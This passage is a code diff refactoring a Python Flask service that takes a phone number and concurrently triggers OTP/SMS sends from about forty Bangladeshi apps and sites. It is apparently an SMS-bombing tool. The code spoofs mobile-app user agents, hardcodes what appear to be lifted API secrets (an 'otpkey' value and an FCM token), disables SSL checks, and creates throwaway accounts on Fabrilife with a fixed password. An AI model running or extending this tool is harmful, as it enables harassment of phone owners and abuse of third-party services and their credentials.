+    return await safe_request(session, "api59_shwapno", "POST", url, json={"phoneNumber": f"+88{phone}"}, headers=headers)
 
 
-# api61.php -> MyBL (Banglalink)
+# MyBL (Banglalink)
 async def hit_api61(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = "https://myblapi.banglalink.net/api/v1/send-otp"
-    payload = {"phone": phone}
-    headers = {"Content-Type": "application/json"}
-    return await safe_request(session, "api61_mybl", "POST", url, json=payload, headers=headers)
+    return await safe_request(
+        session,
+        "api61_mybl",
+        "POST",
+        "https://myblapi.banglalink.net/api/v1/send-otp",
+        json={"phone": phone},
+        headers={"Content-Type": "application/json"},
+    )
 
 
-# api63.php -> PBS
+# PBS
 async def hit_api63(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://apialpha.pbs.com.bd/api/OTP/generateOTP"
-    payload = {"userPhone": phone, "otp": ""}
     headers = {
         "accept": "*/*",
         "content-type": "application/json",
         "origin": "https://pbs.com.bd",
         "referer": "https://pbs.com.bd/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
-    return await safe_request(session, "api63_pbs", "POST", url, json=payload, headers=headers)
+    return await safe_request(
+        session, "api63_pbs", "POST", url, json={"userPhone": phone, "otp": ""}, headers=headers
+    )
 
 
-# api65.php -> Arogga (App)
+# Arogga (App)
 async def hit_api65(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33"
-    fcm_token = "cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR"
     form_data = {
         "mobile": phone,
-        "fcmToken": fcm_token,
+        "fcmToken": "cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR",
         "referral": "",
     }
-    headers = {
-        "User-Agent": "okhttp/4.9.2",
-        "Accept-Encoding": "gzip",
-        "Content-Type": "application/x-www-form-urlencoded",
-    }
+    headers = {"User-Agent": "okhttp/4.9.2", "Accept-Encoding": "gzip", "Content-Type": "application/x-www-form-urlencoded"}
     return await safe_request(session, "api65_arogga_app", "POST", url, data=form_data, headers=headers)
 
 
-# api71.php -> Fabrilife (Register + Phone Login OTP)
+# Fabrilife
 async def hit_api71(session: aiohttp.ClientSession, phone: str) -> dict:
-    signup_url = "https://fabrilife.com/api/wp-json/wc/v2/user/register"
-    signup_payload = {
-        "name": random_name(),
-        "email": f"{phone}@gmail.com",
-        "phone": phone,
-        "password": "Riyaz@123",
-    }
-    signup_headers = {
-        "User-Agent": "okhttp/3.12.12",
-        "Accept-Encoding": "gzip",
-        "Content-Type": "application/json",
-    }
-    signup_res = await safe_request(session, "api71_fabrilife_signup", "POST", signup_url, json=signup_payload, headers=signup_headers)
-
-    otp_url = f"https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{quote(phone)}"
-    otp_headers = {
-        "User-Agent": "okhttp/3.12.12",
-        "Accept-Encoding": "gzip",
-        "otpkey": "uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW",
-    }
-    otp_res = await safe_request(session, "api71_fabrilife_otp", "POST", otp_url, headers=otp_headers)
-
+    signup_res = await safe_request(
+        session,
+        "api71_fabrilife_signup",
+        "POST",
+        "https://fabrilife.com/api/wp-json/wc/v2/user/register",
+        json={"name": random_name(), "email": f"{phone}@gmail.com", "phone": phone, "password": "Riyaz@123"},
+        headers={"User-Agent": "okhttp/3.12.12", "Accept-Encoding": "gzip", "Content-Type": "application/json"},
+    )
+    otp_res = await safe_request(
+        session,
+        "api71_fabrilife_otp",
+        "POST",
+        f"https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{quote(phone)}",
+        headers={
+            "User-Agent": "okhttp/3.12.12",
+            "Accept-Encoding": "gzip",
+            "otpkey": "uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW",
+        },
+    )
     return {"api": "api71_fabrilife", "signup_step": signup_res, "otp_step": otp_res}
 
 
-# api72.php -> Kotha IM (DeviceAuth -> SendOTPV2)
+# Kotha IM
 async def hit_api72(session: aiohttp.ClientSession, phone: str) -> dict:
     device_id = str(uuid.uuid4())
-    auth_url = "https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus"
-    auth_payload = {
-        "deviceId": device_id,
-        "recipient": f"+88{phone}",
-    }
-    auth_headers = {
-        "User-Agent": "okhttp/4.12.0",
-        "Accept-Encoding": "gzip",
-        "Content-Type": "application/json; charset=UTF-8",
-    }
-    auth_res = await safe_request(session, "api72_kotha_auth", "POST", auth_url, json=auth_payload, headers=auth_headers)
-
+    auth_res = await safe_request(
+        session,
+        "api72_kotha_auth",
+        "POST",
+        "https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus",
+        json={"deviceId": device_id, "recipient": f"+88{phone}"},
+        headers={"User-Agent": "okhttp/4.12.0", "Accept-Encoding": "gzip", "Content-Type": "application/json; charset=UTF-8"},
+    )
     token = None
     try:
-        auth_json = json.loads(auth_res.get("response", "{}"))
-        token = auth_json.get("token")
+        token = json.loads(auth_res.get("response", "{}")).get("token")
     except Exception:
         pass
 
@@ -725,94 +639,47 @@ async def hit_api72(session: aiohttp.ClientSession, phone: str) -> dict:
             "otp_step": {"status": "skipped", "reason": "Token not found in response"},
         }
 
-    otp_url = "https://user.kotha.im/mobile/api/sendOTPV2"
-    otp_payload = {
-        "deviceId": device_id,
-        "recipient": f"+88{phone}",
-        "retryAttempt": 0,
-    }
-    otp_headers = {
-        "User-Agent": "kotha-android-version_0.1.20241002-code_285-os-sdk-level_33-manufacturer_OnePlus-model_GM1917-os-sdk-level_33",
-        "Accept-Encoding": "gzip",
-        "Authorization": token,
-        "Content-Type": "application/json; charset=UTF-8",
-    }
-    otp_res = await safe_request(session, "api72_kotha_otp", "POST", otp_url, json=otp_payload, headers=otp_headers)
-
+    otp_res = await safe_request(
+        session,
+        "api72_kotha_otp",
+        "POST",
+        "https://user.kotha.im/mobile/api/sendOTPV2",
+        json={"deviceId": device_id, "recipient": f"+88{phone}", "retryAttempt": 0},
+        headers={
+            "User-Agent": "kotha-android-version_0.1.20241002-code_285-os-sdk-level_33-manufacturer_OnePlus-model_GM1917-os-sdk-level_33",
+            "Accept-Encoding": "gzip",
+            "Authorization": token,
+            "Content-Type": "application/json; charset=UTF-8",
+        },
+    )
     return {"api": "api72_kotha", "auth_step": auth_res, "otp_step": otp_res}
 
 
 @app.route("/", methods=["GET"])
 async def send_all_requests():
     phone = request.args.get("phone")
-
     if not phone:
-        return (
-            jsonify(
-                {
-                    "status": "error",
-                    "message": "Please provide a phone parameter. Example: /?phone=01700000000",
-                }
-            ),
-            400,
-        )
+        return jsonify({"status": "error", "message": "Please provide a phone parameter. Example: /?phone=01700000000"}), 400
 
     start_time = time.perf_counter()
-
     connector = aiohttp.TCPConnector(limit=75, ssl=False)
     timeout = aiohttp.ClientTimeout(total=8.5)
 
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        tasks = [
-            hit_api1(session, phone),
-            hit_api2(session, phone),
-            hit_api3(session, phone),
-            hit_api4(session, phone),
-            hit_api5(session, phone),
-            hit_api7(session, phone),
-            hit_api9(session, phone),
-            hit_api10(session, phone),
-            hit_api11(session, phone),
-            hit_api12(session, phone),
-            hit_api15(session, phone),
-            hit_api20(session, phone),
-            hit_api26(session, phone),
-            hit_api29(session, phone),
-            hit_api31(session, phone),
-            hit_api32(session, phone),
-            hit_api32_2(session, phone),
-            hit_api33(session, phone),
-            hit_api35(session, phone),
-            hit_api35_2(session, phone),
-            hit_api36(session, phone),
-            hit_api37(session, phone),
-            hit_api41(session, phone),
-            hit_api43(session, phone),
-            hit_api46(session, phone),
-            hit_api49(session, phone),
-            hit_api52(session, phone),
-            hit_api53(session, phone),
-            hit_api55(session, phone),
-            hit_api56(session, phone),
-            hit_api56_2(session, phone),
-            hit_api57(session, phone),
-            hit_api58(session, phone),
-            hit_api59(session, phone),
-            hit_api61(session, phone),
-            hit_api63(session, phone),
-            hit_api65(session, phone),
-            hit_api71(session, phone),
-            hit_api72(session, phone),
+        handlers = [
+            hit_api1, hit_api2, hit_api3, hit_api4, hit_api5, hit_api7, hit_api9, hit_api10,
+            hit_api11, hit_api12, hit_api15, hit_api20, hit_api26, hit_api29, hit_api31, hit_api32,
+            hit_api32_2, hit_api33, hit_api35, hit_api35_2, hit_api36, hit_api37, hit_api41, hit_api43,
+            hit_api46, hit_api49, hit_api52, hit_api53, hit_api55, hit_api56, hit_api56_2, hit_api57,
+            hit_api58, hit_api59, hit_api61, hit_api63, hit_api65, hit_api71, hit_api72,
         ]
-        results = await asyncio.gather(*tasks)
-
-    elapsed_time = round(time.perf_counter() - start_time, 3)
+        results = await asyncio.gather(*(fn(session, phone) for fn in handlers))
 
     return jsonify(
         {
             "phone": phone,
             "total_apis": len(results),
-            "time_taken_seconds": elapsed_time,
+            "time_taken_seconds": round(time.perf_counter() - start_time, 3),
             "results": results,
         }
     )
